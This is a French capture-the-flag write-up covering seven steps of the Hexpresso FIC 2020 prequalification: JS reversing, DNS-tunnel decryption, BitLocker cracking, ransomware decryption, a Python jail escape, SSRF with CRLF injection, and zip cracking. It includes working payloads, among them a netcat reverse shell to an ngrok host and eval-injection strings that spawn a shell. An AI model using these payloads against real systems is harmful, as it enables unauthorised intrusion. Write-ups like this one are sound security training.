---
weight: 4
title: "[FIC 2020] - Hexpresso CTF Prequals"
date: 2020-01-21T21:57:40+08:00
draft: false
author: "Maki"
authorLink: "https://www.maki.bzh"
description: ""
images: []
resources:
- name: "featured-image"
  src: "featured-image.png"

tags: ["hexpresso", "fic", "forensic", "pentest", "cryptography", "reverse", "pyjail"]
categories: ["Writeups"]

lightgallery: true
---

Le CTF "CaptureTheFic" est organisé par l'équipe de CTF "Hexpresso". Equipe connue pour ses différents résultats en CTF et pour l'organisation de CTF, tel que le BreizhCTF.

CaptureTheFic se déroule en deux étapes:
- Une étape de pré-qualifications en ligne avec énormément d'équipes;
- Une phase finale au FIC, composée des 14 meilleures équipes issues des pré-qualifications.

Comme ce writeup le montrera, ce CTF n'est pas un jeopardy standard. Cette préqualification comporte 8 étapes et il est nécessaire de terminer une épreuve pour accéder à la suivante.

![](/lib/images/writeups/2020_hexpresso_fic/upload_f44937ec8e786ff1858da67a94d68bfe.png)


## I. Step 1 - Reverse JS
   
| Event        | Challenge | Category | Solves |
| ------------ | --------- | -------- | ------ |
| CatureTheFic | Step 1    | Web      | 674    |

![](/lib/images/writeups/2020_hexpresso_fic/upload_2e6da6a14bb64fe77fe17a6a5682a36a.png)

### I.1. Etat de l'art

On commence ce premier challenge avec une page web qui nous propose de soumettre un flag. Si le flag n'est pas correct, la page nous répond "NOPE" avec une pop-up.

Pour trouver la bonne entrée, nous essayons de voir si la vérification du flag ne se fait pas côté client. Pour cela, on affiche les sources de la page. Après avoir affiché les sources de la page, on remarque un script JavaScript.

![](/lib/images/writeups/2020_hexpresso_fic/upload_2e74054eee2fa876c8c8f38ef401c2b8.png)

La vérification du flag se fait bien côté client. Il faut maintenant comprendre comment marche ce script.

Le script effectue tout simplement une opération arithmétique entre deux chaînes de caractères qui sont notre flag et une constante "u_u" qui vaut "CTF.By.HexpressoCTF.By.Hexpresso".

Pour chaque caractère présent dans la chaîne "u_u", le script va prendre le code UTF-16 du caractère n de la chaîne "u_u", l'additionner avec le code UTF-16 du caractère n du flag rentré par l'utilisateur puis ajouter 42 x n. Il va ensuite comparer ce nombre à l'élément n du tableau game comme montré dans les lignes de code ci-dessous:

```javascript
for (i = 0; i < u_u.length; i++) {
          if (u_u.charCodeAt(i) + flag.charCodeAt(i) + i * 42 != game[i]) {
            alert("NOPE");
            return;
          }
}
```
### I.2. Algorithme de rétroingénierie du script JS

Pour résoudre ce challenge, il suffit de calculer flag qui est égal à

``` javaScript
    flag = char(game[i] - i * 42 - u_u.charCodeAt(i));
```
Pour cela on implémente un script python qui est le suivant pour résoudre ce challenge:

```python
game = [
        116,
        228,
        203,
        270,
        334,
        382,
        354,
        417,
        485,
        548,
        586,
        673,
        658,
        761,
        801,
        797,
        788,
        850,
        879,
        894,
        959,
        1059,
        1071,
        1140,
        1207,
        1226,
        1258,
        1305,
        1376,
        1385,
        1431,
        1515
        ]

u_u = "CTF.By.HexpressoCTF.By.Hexpresso";
        #flag = document.getElementById("flag").value;
for i in range(len(u_u)):
    print("%s" % chr((ord(u_u[i]) - game[i] + i*42 )*-1), end = '')
```

> 1f1bd383026a5db8145258efb869c48f

Une fois le bon flag soumis, on arrive directement à l'étape 2.

## II. Step 2 - Old EXFIL but Gold

https://ctf.hexpresso.fr/1f1bd383026a5db8145258efb869c48f

| Event        | Challenge | Category | Solves |
| ------------ | --------- | -------- | ------ |
| CatureTheFic | Step 2    | Forensic / Crypto      | 531    |

### II.1. Etat de l'art

![](/lib/images/writeups/2020_hexpresso_fic/upload_264dea3e7b82050631a5215821682f40.png)

Cette deuxième épreuve nous laisse avec un fichier pcap.

On remarque différents types de flux dont beaucoup de paquets utilisant le protocole DNS. Après avoir suivi le HTTP Stream sur Wireshark de certains paquets, on remarque que l'utilisateur a voulu implémenté un tunnel DNS en python (dnstunnel.py) avec un algorithme de chiffrement maison laissant à désirer.

![](/lib/images/writeups/2020_hexpresso_fic/upload_6343d17e234d7f87f3f884dc1c16c905.png)


```python
#!/usr/bin/python3
# I have no idea of what I'm doing

#Because why not!
import random
import os

f = open('data.txt','rb')
data = f.read()
f.close()

print("[+] Sending %d bytes of data" % len(data))

#This is propa codaz
print("[+] Cut in pieces ... ")

def encrypt(l):
    #High quality cryptographer!
    key = random.randint(13,254)
    output = hex(key)[2:].zfill(2)
    for i in range(len(l)):
        aes = ord(l[i]) ^ key
        #my computer teacher hates me
        output += hex(aes)[2:].zfill(2)
    return output

def udp_secure_tunneling(my_secure_data):
    #Gee, I'm so bad at coding
    #if 0:
    mycmd = "host -t A %s.local.tux 172.16.42.222" % my_secure_data
    os.system(mycmd)
    #We loose packet sometimes?
    os.system("sleep 1")
    #end if

def send_data(s):
    #because I love globals
    global n
    n = n+1
    length = random.randint(4,11)
    # If we send more bytes we can recover if we loose some packets?
    redundancy = random.randint(2,16)
    chunk = data[s:s+length+redundancy].decode("utf-8")
    chunk = "%04d%s"%(s,chunk)
    print("%04d packet --> %s.local.tux" % (n,chunk))
    blob = encrypt(chunk)
    udp_secure_tunneling(blob)
    return s + length

cursor = 0
n=0
while cursor<len(data):
    cursor = send_data(cursor)

#Is it ok?
```

On importe en local ce script pour comprendre son fonctionnement.

La méthode de chiffrement est un simple XOR:

```python
aes = ord(l[i]) ^ key
```

On remarque aussi que la clef est transmise en claire avec les données chiffrées dans la fonction "encrypt" grâce à la ligne suivante:

```python
output = hex(key)[2:].zfill(2)
```

Cette clef est le premier octet envoyé lors d'une communication en utilisant ce tunnel DNS maison.

### II.2. Fonction de déchiffrement

Il nous suffit maintenant de créer un script qui va prendre le premier octet de données comme clef et qui va nous permettre de déchiffrer le contenu du tunnel DNS comme ci-dessous:

```python
f = open("dns.txt", "r")
index_str = ""
index = 0
length = 0
for x in f:
    key = int(x[0:2], 16)
    pos = length + index
    index_str = ""
    for i in range(2, 10, 2):
        index_str += chr(int(x[i:i+2], 16) ^ key)
    index = int(index_str)
    text = ""
    for i in range(10 + 2*(pos-index) , len(x)-1, 2):
        text += chr(int(x[i:i+2], 16) ^ key)
        length = len(text) +pos - index
    print(text, end='')
print("\n")
```

### II.3. Extraction des sous domaines

Une fois cette fonction réalisée, il nous fait extraire tous les sous domaines présents dans le pcap contenant les données chiffrées.

![](/lib/images/writeups/2020_hexpresso_fic/upload_265b42607a2fef97df3c6baa31bb5efd.png)

Pour cela on va utiliser l'outil tshark en lui donnant les filtres adéquates.

> tshark -r cb52ae4d15503c598f0bb42b8af1ce51.pcap -Y 'dns.qry.name && ip.src == 172.16.42.99' -Tfields -e "dns.qry.name" |sed 's/\.local\.tux//g'

Cette commande va nous permettre d'extraire les informations utiles pour la résolution de cette étape:

```
0000   :   a191919191e2cecfc6d3c0d5d4cdc0d5c8cecfd2808081f8
0001   :   a696969797cfc9c8d5878786ffc9d386c2cfc286cfd286d5c986c0
0002   :   88b8b8bab8fda8ece1eca8e1fca8fbe7a8eee9faa98282c0edfaeda8e1fba8
0003   :   1929292a2976397f786b381313517c6b7c39706a396d
0004   :   cafafaf9f3afb8afeaa3b9eabea2afeaa6a3a4a1ea
0005   :   edddddd9d4cd81848386cd8483cd8f8c9e
0006   :   6b5b5b5e520a180e58594b0d0419
0007   :   4f7f7f797b6f29203d227545010d7d07067b0b1b070617
0008   :   ae9e9e999fe0ec9ce6e79aeafae6e7f6fd98f79dfbe3f7f6e9ff
0009   :   9cacacababd8c8d4d5c4cfaac5afc9d1c5c4dbcdc6d0c5
0010   :   6c5c5c545d343f5a355f392135342b3d362035
0011   :   6f5f5f575a5c3a223637283e352336
0012   :   e4d4d4ddd6bea8bdaba6bea3
0013   :   d7e7e7eee08d909ce3e48399e38f909ae3
0014   :   73434243403d472b343e47212334264027203c37373e3641373c
0015   :   daeaebebe88fe98e89959e9e979fe89e95809e989794898e9183
0016   :   4272737070060d1806000f0c1116091b18140f177105
0017   :   36060704017b7865627d6f6c607b6305717f7b6c60717f02623c7b797c
0018   :   9cacadafabafdbd5d1c6cadbd5a8c896d1d3d6cdd1
0019   :   54646560650e02131d60005e191b1e051919601019190e0013606605016969
0020   :   25151410176868116168687f716211177470181818
0021   :   f7c7c6c2cea3b0c3c5a6a2cacacafdfdd7a8d7d7d7d7
0022   :   7b4b4a4d482a2e46464671715b245b5b5b5b5b5b
0023   :   95a5a4a3ad9f9fb5cab5b5b5b5b5b5b5b5b5b5b5b5b5
0024   :   d8e8e9efe1f8f8f8f8f8f8f8f8
0025   :   d6e6e7eee5f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6f6
0026   :   0f3f3e37362f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f2f
0027   :   eededfd7d8cecececececececececece
0028   :   56666466637676767676767676767676765c2a
0029   :   7d4d4f4c4e5d5d5d5d77015d0122225d5d5d22
0030   :   94a4a6a6a0b4b4cbcbcbcbcbb4b4cbcbcbb4cb
0031   :   7c4c4e4e442323235c5c2323235c23235c
0032   :   b585878680ea95eaea9595ea95eaea
0033   :   facac8cec9a5a5daa5a5a5dadaa5a5a5daa5a5a5dadaa5
0034   :   10202225234f304f4f4f30304f4f4f
0035   :   daeae8eceb8585fafad0a6
0036   :   75454743407f0955522a5529555a552a55295529
0037   :   6656545155494639463a463a494649464139463a1a464139
0038   :   4e7e7c767d6e69116e12326e691111616e
0039   :   5f6f6d6767237f780000707f007f03707f0000707f0000
0040   :   eddddfd4d5c2cdb2b2c2cdb2b291c2
0041   :   e7d7d4d7d4c7b8b89bc8c7b8c7bbc7ed9bc79bc79bc79bc7c7b8b8c8
0042   :   88b8bbb9b8a8d4a882f4a8f4a8f4a8f4a8a8d7d7a7b6a8a8b4f4a8f4
0043   :   83b3b0b1b3ffa3a3dcdcacbda3a3bfffa3ff
0044   :   48787b7a70687434683417616834683468346868
0045   :   cdfdfefefe92e4edb1edb1edb1eded9292e2919292ed9192
0046   :   eededddadcceb1b1c1b2b1b1ceb2b1b1ceb2cec6b1c7ce92e492b192ce
0047   :   b38380868093ef939bec9a93cfb9cfeccf93cfeccfef
0048   :   c2f2f1f4f0be9dbee2be9dbe9e9d9d9ded9ded9e9d9ee2ec9d
0049   :   28181b1f197777077707747774080677770754775408087477777754547777
0050   :   80b0b3b8b2dfaffcdffca0a0dcdfdfdffcfcdfdfdfaf
0051   :   3b0b0803026764646447476464641464
0052   :   93a3a0aaa4ccbcccccccbccfccccccbcb399b3b3b3b3b3b3
0053   :   41717571701e6e1d1e1e1e6e614b6161616161616161616161
0054   :   28181c18112208080808080808
0055   :   ddede9eceefdfdfdfdfdfdfdfdfdfdfdfdfda1
0056   :   d3e3e7e1e7f3f3af8caff3f3f3f3f3f3f3f3f3f3
0057   :   97a7a3a4a6b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7b7
0058   :   f2c2c6c1c7d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2
0059   :   340400000714141414141414141414141414143e3e3e
0060   :   9fafababa8bfbfbfbfbfbfbfbfbfbf959595
0061   :   6555515056454545456f6f6f
0062   :   84b4b0b1bd8e
```

### II.4. Flag

Une fois l'extraction faite, il nous suffit de déchiffrer la sortie de la commande tshark grâce à la fonction de déchiffrement mise en place en II.2:

```
Congratulations!! You did it so far!

Here is the link in base32 form:
NB2HI4DTHIXS6Y3UMYXGQZLYSODDME2DOZDBMNSTKYZVMU3GIMZVGI4T
MOJQMM4DMMZTG42QU===

_
| |__ _____ ___ __ _ __ ___ ___ ___ ___
| '_ \ / _ \ / / '_ | '/ _ / / |/ _ \
| | | | /> <| | \ () |
|| |_|_/_/_\ ./|_| _||___/_/_/

```
Le lien décodé nous donne accès à l'étape 3:

> https://ctf.hexpresso.fr/5798ca47dace5c5e6d3529690c863375

## III. Step 3 - Do your Forensic ANALyst job

| Event        | Challenge | Category | Solves |
| ------------ | --------- | -------- | ------ |
| CatureTheFic | Step 3    | Forensic      | 347    |

### III.1. Etat de l'art

![](/lib/images/writeups/2020_hexpresso_fic/upload_b58f4ad246da510b8b98c29204ede676.png)

Le fichier utilisé pour cette épreuve est un dump de disque:

![](/lib/images/writeups/2020_hexpresso_fic/upload_ad45fa68221c1bfc0cc145a8050f3e02.png)

La première chose à faire de voir les différentes partitions disponibles dans ce fichier:

![](/lib/images/writeups/2020_hexpresso_fic/upload_1881eedbeba7dc96fb578a6fd2ee1364.png)


On voit différentes partitions, dont une partition NTFS qui peut nous intéresser  à l'offset `512*128`, soit la taille d'un secteur multiplié par l'offset de début de la partition. 

Sur la première image, il est possible de voir des erreurs dans l'output de la commande "file". Il s'agit peut-être d'une partition endommagée ou chiffrée... Pour en être sûr, regardons les premiers octets de la partition NTFS:

![](/lib/images/writeups/2020_hexpresso_fic/upload_0c8e34cceee82b95a848f76ed6d1636b.png)

L'en-tête "-FVE-FS-" signifie que nous sommes en présence d'un volume bitlocker.

### III.2. Trouver la clé

Pour déchiffrer un volume bitlocker, il existe plusieurs façons:

1. Connaitre le mot de passe de l'utilisateur
2. Récupérer la clé dans un dump mémoire
3. Avoir la clé de récupération bitlocker

Dans notre cas, c'est forcément avec le mot de passe utilisateur. Ne le connaissant pas, il reste 2 possibilitées: 

1. Bruteforcer le mot de passe
2. Deviner le mot de passe

Etant un bourrin dans l'âme, cet article m'a aidé: https://medium.com/adamantsec/write-up-of-bsideslisbon-ctf-df479bff8b7d

Connaissant un peu Hexpresso, je me suis dis que ça ne serait pas du guessing avec un quelque chose d'exotique, donc j'ai tenté de lancer un rockyou:

![](/lib/images/writeups/2020_hexpresso_fic/upload_de9c5345e5faef9556b201ea069932f8.png)

Le mot de passe bitlocker est donc: `password`.

Il ne reste qu'à monter le volume:

![](/lib/images/writeups/2020_hexpresso_fic/upload_f4d171a63bb28d195c6850ecab742ebd.png)

### III.3. Récupérer les fichiers supprimés

En déchiffrant le volume bitlocker avec `dislocker`, puis en montant le volume déchiffré, on se rend rapidement compte qu'il n'y a pas de flag, mais seulement un petit message de la part de l'auteur du challenge.

![](/lib/images/writeups/2020_hexpresso_fic/upload_63f8056849b69eb15bfcdf10a6d7da75.png)

Dans ma méthodologie d'analyse, la première chose à faire avec un dump de disque est d'inspecter le disque avec `testdisk`, à la recherche de fichiers supprimés.

```bash
$ testdisk dislocker-file

Proceed > None > Advanced > Undelete
```

![](/lib/images/writeups/2020_hexpresso_fic/upload_2d0c712c570060a2b9ccab08390e52dc.png)

Le fichier `fic.zip` présage plein de bonnes choses. Un coup de "c c" et "q q q q" dans testdisk, et voilà le zip récupéré.

![](/lib/images/writeups/2020_hexpresso_fic/upload_efdd62191529cbd67b8b3e102935f813.png)

Finalement, l'archive zip nous renvoie vers un gist:

> https://gist.github.com/bosal43833/3e815abc3f92e45963a8aafc8acfe411

![](/lib/images/writeups/2020_hexpresso_fic/upload_6c4ce8e15e98609c85123834d2d45f0a.png)

### III.4. Flag

```bash
$ echo -n 'aHR0cHM6Ly9jdGYuaGV4cHJlc3NvLmZyLzFlYTk2N2Y1MmQxYWFiMzI3ZDA4NGVmZDI0ZDA0OTU3Cg==' |base64 -d
https://ctf.hexpresso.fr/1ea967f52d1aab327d084efd24d04957
```

## IV. Step 4 - Wannacry is f*cking back

| Event        | Challenge | Category | Solves |
| ------------ | --------- | -------- | ------ |
| CatureTheFic | Step 4    | Reverse / Crypto      | 244    |

### IV.1. Etat de l'art

![](/lib/images/writeups/2020_hexpresso_fic/upload_d232c694fb4034546cfee644f22aada4.png)

> Le malware est disponible à l'adresse suivante : https://ctf.hexpresso.fr/5c09555ef0576e6cee46a9ee7a841c8b.zip

Cette épreuve commence donc avec deux fichiers : 

```bash
$ wget https://ctf.hexpresso.fr/5c09555ef0576e6cee46a9ee7a841c8b.zip                          

$ unzip 5c09555ef0576e6cee46a9ee7a841c8b.zip
Archive:  5c09555ef0576e6cee46a9ee7a841c8b.zip
 extracting: flag.txt.crypt          
  inflating: wannafic                

$ file *
5c09555ef0576e6cee46a9ee7a841c8b.zip: Zip archive data, at least v1.0 to extract
flag.txt.crypt:                       data
wannafic:                             ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=97354f92f87502594330507adef22eca2765dd76, for GNU/Linux 3.2.0, stripped
```

### IV.2. Analyse du binaire

En plaçant le binaire "wannafic" dans Ghidra, on remarque très rapidement qu'il y a que très peu de code dans le main:

![](/lib/images/writeups/2020_hexpresso_fic/upload_414376f09f26890c020ef6a94b4697ca.png)

Tout le traitement se fait dans la fonction "payload_fn":

![](/lib/images/writeups/2020_hexpresso_fic/upload_db5d79d6ccda4b95100ca24c7e16eb80.png)

Dans la fonction "payload_fn", les deux lignes encadrées sont importantes:

1. Orange: Récupération du timestamp actuel au format epoch ;
2. Rouge: Une fonction prenant comme paramètre le contenu du fichier et le timestamp.

Dans la fonction "crypt_fn", on voit le srand se basant sur le timestamp format epoch (encadré rouge), mais aussi l'algo permettant de chiffrer le fichier en entrée.

![](/lib/images/writeups/2020_hexpresso_fic/upload_d09167a51b498665153198e79b644871.png)

La boucle va générer un keystream se basant sur le timestamp et va xorer caractère par caractère:

```
input_file[rand_output % size_input_file] ^ (_char_n ^ rand_output)
```

L'opération étant réversible, il est possible de déchiffrer le fichier en prenant son timestamp comme base pour générer le keystream.

### IV.3. Déchiffrement du fichier

Pour tenter l'hypothèse évoquée ci-dessus, il faut récupérer le timestamp de "flag.txt.crypt":

```bash
$ stat -c %Y flag.txt.crypt        
1576154262
```

L'argument "%Y" donne le timestamp de la dernière modification du fichier depuis epoch.

Pour hooker la fonction time du binaire et forcer le retour à ce timestamp précis, il existe la technique du "LD_PRELOAD". Le but est de créer une fonction du même nom, time en l'occurence, pour forcer une action précise. 

Dans notre cas, l'action bien précise est de forcer le retour de la fonction time du binaire avec le timestamp du fichier chiffré. 

```c
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

time_t time(time_t *t) {
	return 1576154262;
}
```

Avant le lancement du binaire, on renomme le fichier chiffré en flag.txt:

![](/lib/images/writeups/2020_hexpresso_fic/upload_5bae307c265a085bd0a9b4b6db594ad2.png)

L'output ne ressemble pas à grand chose, mais ce qui est affiché est bien plus petit que le fichier chiffré.

![](/lib/images/writeups/2020_hexpresso_fic/upload_6161435a77ef10618d2396a8cf40e272.png)

Le caractère `\xff` a l'air de péter l'output. Les caractères `\x0a`, `\x0d` et `\x00` risquent de péter l'output également. Une technique "c'est moche mais ça marche", serait de patcher le fichier chiffrer en remplaçant ces badchars par un caractère imprimable, comme `A` par exemple. Le déchiffrement à ces caractères ne fonctionneraient pas, mais avec un peu de chance on pourra quand même récupérer le hash pour passer à la suite.

```python
>>> enc_dat = open('flag.txt','rb').read()
>>> enc_dat = enc_dat.replace('\xff','A').replace('\x0a','A').replace('\x0d','A').replace('\x00','A')
>>> open('flag.txt','w').write(enc_dat)
```

### IV.4. Flag

```bash
$ gcc time.c -o time -shared -fPIC; LD_PRELOAD="${PWD}/time" ./wannafic flag.txt; cat flag.txt.crypt

 ██░ ██ ▓█████ ▒█   █\▒ ██▓█\█   ██▀███  ▓█████   █████   ██████  ▒█████      █     █░ ▄▄▄        ██████     █░ ██ ▓█████  ██▀██  ▓█████ 
██░ ██▒▓█   ▀ ▒▒ █ █ ▒░▓██░  ██▒▓██ ג ██▒▓█   ▀ ▒██    ▒ ▒██    ▒ ▒██▒  ██▒   ▓░ █ ░█░▒████▄    ▒██    ▒    ▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒▓█   ▀ 
▒█▀▀██░▒███   ░░  █  ░▓██░ ██▓▒▓██ ░▄█ ▒▒███   ░ ▓██▄   ░ ▓██▄   ▒██░  ██▒   ▒█░ █ ░█ ▒██  ▀█▄  ░ ▓██▄      ▒██▀▀██░▒███   ██ ▄█ ▒▒███   
░▓█ ░██ ▒▓█  ▄  / █ █ ▒ ▒██▄█▓▒ ▒▒██▀▀█▄  ▒▓█ ▄   ▒   ██  ▒   ██▒▒██   ██░   ░█░ █ ░█ ░██▄▄▄▄██l  ▒   ██▒   ░▓█ ░██ ▒▓█  ▄ ██▀▀█▄  ▒▓█  ▄ 
░▓█▒░██▓░▒███▒▒██▒ ▒██▒▒██▒ ░  ░░██▓ ▒██▒░▒████▒▒██████▒▒▒██████▒▒░ ████▓▒░   ░░██▒██  ▓█   ▓█▒▒████▒▒   ░▓█▒░██▓░▒███▒░██▓ ▒██▒░▒███\▒
 ▒ ░░▒░▒░░ ▒░ ░▒▒ ░ ░▓ ░▒▓▒░ ░  ░░ ▒▓ ░▒▓░░░ ▒( ░▒ ▒▓▒ ▒ ░▒ ▒▓▒  ░░ ▒░▒░▒░    ░▓░▒ ▒   ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░    ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░░ ▒░ ░
 ▒ ░▒░ ░ ░ ░  ░\░   ░▒ ░░▒ ░       ░▒ ░ ▒░ ░ ░  ░░ ▒  ░ ░░ ░▒  ░ ░  ░ ▒ ▒░      ▒ ░ ░      ▒ ░░░▒  ░ ░    ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░ ░ ░  ░
 ░  ░░ ░   ░    ░    ░  ░        ░░   ░    ░   ░  ░  ░  ░  ░  ░  ░ ░ ░ ▒       ░       ░   ▒   ░  ░  ░        ░░ ░   ░     ░░   ░    ░   
 ░  ░  ░   ░  ░ ░    ░             ░        ░  ░      ░        ░      ░ ░         ░          ░  ░      ░      ░  ░  ░   ░  ░   ░        ░  ░
                                      k                                                                        k                           

Well done buddy !!!!
Next step : https{//ctf.hexpresso.fr/6bd1d24ab3aa08784f868a533bcdc215
```

> https://ctf.hexpresso.fr/6bd1d24ab3aa08784f868a533bcdc215

## V. Step 5 - PYJAIL 4 FUN


| Event        | Challenge | Category | Solves |
| ------------ | --------- | -------- | ------ |
| CatureTheFic | Step 5    | PyJail      | 234    |

![](/lib/images/writeups/2020_hexpresso_fic/upload_57c389cb189abc052097f2ec296d40a5.png)

### V.1. Etat de l'art

On commence cette épreuve avec une archive contenant des certificats ssl et une commande socat:

![](/lib/images/writeups/2020_hexpresso_fic/upload_1d9c480de6df215db2667838dbde40cd.png)

En se connectant, la première chose que je teste est d'afficher une chaine de caractère:

![](/lib/images/writeups/2020_hexpresso_fic/upload_5651f4868f9a065f83d88a1b658fc0e0.png)

Visiblement, il n'aime pas les simples quotes. Au final, avec la syntaxe suivante il est possible d'afficher la chaine de caractère:

![](/lib/images/writeups/2020_hexpresso_fic/upload_126ae445cf09947c5f3774822a604747.png)

> `'+print("hello")+'`

### V.2. Récupération du code

Maintenant qu'on peut executer du python, il est possible de pop un shell grâce à la librairie `pty`.

![](/lib/images/writeups/2020_hexpresso_fic/upload_e7f75504223a2e36df814f046c31a38a.png)

> `'+__import__("pty").spawn("sh")+'`

Cet accès shell permet de récupérer le code du challenge, situé dans "main.py":

```python
#!/usr/bin/env python
import os

SUCCESS = "Good flag !"
FAIL = "Bad flag !"


def get_flag():
    flag = os.environ.get("FLAG", "FLAG{LOCAL_FLAG}")
    os.environ.update({"FLAG": ""})
    return flag


def get_input():
    return eval(f"""'{input(">")}'""")


def main():
    flag = get_flag()

    if flag == get_input():
        print(SUCCESS)
    else:
        print(FAIL)


if __name__ == "__main__":
    main()
```

Le shell timeout au bout de quelque seconde en permanence, ce qui est très embêtant pour faire son énumération. Grâce à la commande `nohup` sous Linux, il est possible de créer des process indépendamment de l'utilisateur. C'est à dire que si je fais un reverse shell, il sera accessible même si je timeout.

Avec `ngrok`, pas besoin de VPS pour récupérer un shell. L'article de TheLaluka en parle bien: https://thinkloveshare.com/en/hacking/ngrok_your_dockersploit/

Le but de `ngrok` est d'ouvrir une socket TCP sur internet bindé à un ncat en écoute.

![](/lib/images/writeups/2020_hexpresso_fic/upload_41177383c501c919d6e6eab4078320f5.png)

![](/lib/images/writeups/2020_hexpresso_fic/upload_fe3eecc09702ffd2afc182484217a8aa.png)

> `'+__import__("pty").spawn("sh")+'`
> `nohup nc 0.tcp.ngrok.io 16368 -e /bin/sh >/dev/null 2>&1 &`

### V.3. Analyse de la pyjail

La fonction `get_flag()` de la pyjail est vraiment inréressante:

```python
def get_flag():
    flag = os.environ.get("FLAG", "FLAG{LOCAL_FLAG}")
    os.environ.update({"FLAG": ""})
    return flag
```

1. `flag = os.environ.get("FLAG", "FLAG{LOCAL_FLAG}")` : Récupère la valeur de la variable d'environnement "FLAG" et la met dans la variable "flag";
2. `os.environ.update({"FLAG": ""})` : Va clear la variable d'environnement "FLAG";
3. `return flag` : Retourne la valeur de la fonction flag.

Donc ça veut dire que le flag présent dans la variable "flag" est toujours en mémoire lors de la première exécution. 

```python
def main():
    flag = get_flag()

    if flag == get_input():
```

Quand le script attend une input, le flag est présent en mémoire. 

### V.4. Debug all the things

En cherchant différents modules, on tombe sur le module `pdb` de python qui est le debugger python. Grâce à l'injection de python dans le programme, il est possible de debug directement le script:

![](/lib/images/writeups/2020_hexpresso_fic/upload_89f95b5a0b99c3eb8235e0f69aa71a5b.png)

> `'+print(__import__("pdb").set_trace())+'`

* `n` : Instruction suivante; 
* `l` : Affiche les sources dans la contexte actuel;
* `p var` : Affiche le contenu de la variable "var".

Il suffit de passer aux "instructions" suivantes jusqu'à attérir dans la fonction "main()" et afficher le contenu de la variable "flag".

### V.5. Flag

> http://c4ffddcc437c5df3e6d681e7cafab510.hexpresso.fr

### V.6. Bonus

En bonus, il est possible de récupérer le flag plus facilement:

![](/lib/images/writeups/2020_hexpresso_fic/upload_62f8a4e215f7fce0971f998ba55fe7e1.png)

En effet, comme le programme va chercher son flag dans une variable d'environnement, un des process doit l'avoir encore en mémoire.

## VI. Step 6 - The Host fetcher

| Event        | Challenge | Category | Solves |
| ------------ | --------- | -------- | ------ |
| CaptureTheFic | Step 6    | Web      | 184    |

### VI.1. Etat des lieux

On commence ce challenge avec un site web. Visiblement il attend une URL en entrée et affiche le retour dans l'Iframe situé sous le bouton "submit".

![](/lib/images/writeups/2020_hexpresso_fic/upload_115f211507ce560cbaad7bd9a400abd4.png)

Ce challenge ressemble beaucoup à une SSRF. Le but va être de voir s'il est possible de taper sur le localhost:

![](/lib/images/writeups/2020_hexpresso_fic/upload_8814b40771f26479c0e26bcdbdc79d7a.png)

En l'occurence, `127.0.0.1` est blacklisté. Une technique courante est de passer par l'ipv6, `[::]`.

![](/lib/images/writeups/2020_hexpresso_fic/upload_671488712dff4e0d090827fe3dcf089e.png)

L'iframe renvoit le contenu du port 80, c'est une excellente nouvelle. De plus, les sources de la page nous apprend l'existence d'un endpoint `secret`:

![](/lib/images/writeups/2020_hexpresso_fic/upload_20a1cc1e7a7468f53cf364176552bd10.png)

> `[::]/secret`

On sait donc sur quoi taper pour avoir le flag.

### VI.2. Request-ception

En essayant de taper directement sur le endpoint `secret`, ce dernier renvoie une 404. Cependant, si on y passe un paramètre aléatoire, alors un message plus verbeux apparait.

![](/lib/images/writeups/2020_hexpresso_fic/upload_6ebe23ba5e2d10cceae3314b9a0d2e1f.png)

![](/lib/images/writeups/2020_hexpresso_fic/upload_41efecbf10029577622676492f868c8b.png)

Il faut donc trouver un moyen de set le cookie "GOSESSION" dans la SSRF. Pour celà, il est possible d'injecter des CRLF et construire une requête HTTP:

> `[::]/secret?a=1 HTTP/1.1\r\nCookie: GOSESSION=test`

En principe, la requête utilisée pour la SSRF sera passée avec cette en-tête:

![](/lib/images/writeups/2020_hexpresso_fic/upload_1e66389b6fa8ff8be01033a3b3d3f77b.png)

![](/lib/images/writeups/2020_hexpresso_fic/upload_50ce869d747c79769bdb3713f7e91c46.png)

Finalement, avec l'injection CRLF dans le payload de la SSRF il est possible de modifier les en-tete et ainsi obtenir le flag.

### VI.3. Flag

> https://ctf.hexpresso.fr/219058289d8699adc0b119374c2fc5bc

## VII. Step 7 - PWN me I'm famous

| Event        | Challenge | Category | Solves |
| ------------ | --------- | -------- | ------ |
| CatureTheFic | Step 7    | Pwn      | 12    |

### VII.1. Etat des lieux

![](/lib/images/writeups/2020_hexpresso_fic/upload_5f1d11dfd539d74dcbac4c405e2e1bcb.png)

On commence donc cette dernière épreuve par un zip chiffré:

![](/lib/images/writeups/2020_hexpresso_fic/upload_0c10df27deb5496a74511ed017f24c1e.png)

Comme tout CTFer qui se respect, toujours faire un peu d'OSINT sur l'équipe orga. Et ça a payé! 
En effet, sur le gist de `chaign_c`, il y a un dockerfile:

```dockerfile
FROM ubuntu:xenial
# http://phusion.github.io/baseimage-docker/

RUN apt update && apt install -y socat
# This ubuntu is required because we need a very specific version of glibc2.23
# FROM phusion/baseimage:0.11
RUN useradd -ms /bin/bash  ctf
USER ctf

COPY ./chall /chall
COPY ./flag.txt /
EXPOSE 80/tcp

CMD socat -d -d TCP-LISTEN:4242,reuseaddr,fork EXEC:/chall/heapme
```

> https://gist.github.com/nongiach/257e5103ef21235d56926bc053af38dc

Il est vrai que ça ressemble beaucoup au challenge actuel. Ce Dockerfile ne nous apprend pas grand chose, sauf qu'il tourne avec une image `ubuntu:xenial`. 

### VII.2. Cassage du zip

Lors du listing des fichiers dans l'archive, on a pu voir la `libc-2.23.so`. Selon l'algo de ZIP, il est possible de faire du clair connu avec `pkcrack`.

Pour extraire la libc du docker, il suffit de faire un volume partagé entre l'hote et le container:

![](/lib/images/writeups/2020_hexpresso_fic/upload_9fd6e86525ba0be31a3a7c20ac71320e.png)

Le tool `pkcrack` a besoin d'un élément dans le zip, du zip en clair de cet élément et finalement déchiffrer le reste du zip.

![](/lib/images/writeups/2020_hexpresso_fic/upload_68477772ee42b7aae93107d937c8fcb8.png)

![](/lib/images/writeups/2020_hexpresso_fic/upload_e2f6445498b9fefedb3aab202889fad0.png)

Maintenant que le zip est déchiffré, il faut réussir le "heapme"

